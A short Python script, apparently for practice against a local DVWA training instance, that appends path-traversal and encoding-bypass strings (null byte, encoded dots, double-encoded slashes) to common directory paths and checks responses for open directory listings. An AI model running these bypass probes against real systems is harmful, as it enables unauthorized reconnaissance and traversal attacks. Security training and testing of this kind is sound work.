import requests

def bypass_sanitization(directory):
    # Attempt various bypass techniques
    bypassed_directories = [
        directory,
        directory + '%00',  # Null byte injection
        directory + '/',  # Trailing slash
        directory + '%2e%2e',  # URL encoded dots
        directory + '..;/',  # Directory traversal
        directory + '%3f',  # URL encoded question mark
        directory + '%23',  # URL encoded hash
        directory + '.%2e/',  # Dot dot slash encoded
        directory + '..%5c%5c',  # Double backslash encoded
        directory + '..%255c',  # Double encoded backslash
        directory + '..%252f',  # Double encoded forward slash
        directory + '..%2e%2e/',  # Double dot encoded
        directory + '%3f/',  # Encoded question mark with slash
        directory + '%23/',  # Encoded hash with slash
     
    ]
    return bypassed_directories

def check_directory_listing(session, base_url):
    directories = [
        base_url,
        base_url + 'images/',
        base_url + 'uploads/',
        base_url + 'files/',
        base_url + 'backup/'
    ]

    for directory in directories:
        bypassed_directories = bypass_sanitization(directory)
        for bypassed_directory in bypassed_directories:
            response = session.get(bypassed_directory)
            if "Index of" in response.text:
                print(f"Directory listing enabled at {bypassed_directory}")
            else:
                print(f"Directory listing not enabled at {bypassed_directory}")

# Example usage
if __name__ == "__main__":
    session = requests.Session()
    base_url = "http://127.0.0.1/DVWA/"  # Adjusted for local DVWA instance
    check_directory_listing(session, base_url)
